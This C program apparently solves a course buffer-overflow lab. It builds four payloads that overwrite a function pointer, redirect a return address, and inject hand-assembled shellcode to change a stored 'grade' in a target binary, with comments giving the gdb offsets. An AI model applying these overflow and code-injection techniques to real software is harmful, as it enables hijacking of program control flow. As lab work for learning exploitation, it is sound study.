#include <stdio.h>

int main(int argc,char *argv[]) {
	
	
	
	/**
	* (gdb) print (long)&buf - (long)&f
	* $1 = -72
	* (gdb) print setGradeToD
	* $2 = {void (void *)} 0x4007b8 <setGradeToD>
	* Thus, we are filling D[72...75] with address of setGradeToD
	*/	
	//lol it's in reversed order, from right to left....
	char D[76] = "Frank";
	D[72] = 0xb8;
	D[73] = 0x07;
	D[74] = 0x40;
	D[75] = 0x00;
	
	/**
	* This is similar to D, we just simply leave E[72...75] as '\000',
	* so that &f = &checkName will be replaced with all 0s
	*/
	char E[76] = "Frank";
	
	/*
	In disassemble main, we found:
	0x00000000004007fe <+114>:   callq  0x4006fe <readString> 
    0x0000000000400803 <+119>:   mov    $0x600dc0,%esi
	......
	0x000000000040081e <+146>:   movb   $0x43,0x20055f(%rip)        # 0x600d84 <grade>
	that is to say, the return address of readString is "0x0000000000400803"
	we try to change the return address to 0x000000000040081e, thus the grade can be changed into C.	
	*/
	char C[124] = "Frank";	
	//Restore the address of method checkName
	C[72] = 0x59;
	C[73] = 0x08;
	C[74] = 0x40;
	C[75] = 0x00;
	//change the return address
	C[120] = 0x1e;
	C[121] = 0x08;
	C[122] = 0x40;
	C[123] = 0x00;
	
	
	//movb $0x42, 0x600d84
	//jmp 0x400803
	
	char B[124] = "Frank\0";
	
	// B[6] = 0xc6;
	// B[7] = 0x05;
	// B[8] = 0x84;
	// B[9] = 0x0d;
	// B[10] = 0x60;
	// B[11] = 0x00;
	// B[12] = 0x42;
	
	B[6] = 0xc6;
	B[7] = 0x04;
	B[8] = 0x25;
	B[9] = 0x84;
	B[10] = 0x0d;
	B[11] = 0x60;
	B[12] = 0x00;
	B[13] = 0x42;
	
	//TODO: translate assembly to hex
	//jump and return
	B[14] = 0xe9;
	B[15] = 0x02;
	B[16] = 0x01;
	B[17] = 0x00;
	B[18] = 0x00;
	B[19] = 0x00;
	
	//Restore the address of method checkName
	B[72] = 0x59;
	B[73] = 0x08;
	B[74] = 0x40;
	B[75] = 0x00;
	
	//write the return address to buffer which contains above assembly code.
	//jump to code at the beginning of the array
	B[120] = 0xc6;
	B[121] = 0x0d;
	B[122] = 0x60;
	B[123] = 0x00;


	switch(argv[1][0]) {

	case 'd':
		write(1,D,76);
		break;
	case 'e':
		write(1,E,76);
		break;
	case 'c':
		write(1, C, 124);
		break;
	case 'b':
		write(1, B, 124);
		break;
	default:
		break;
	}
}
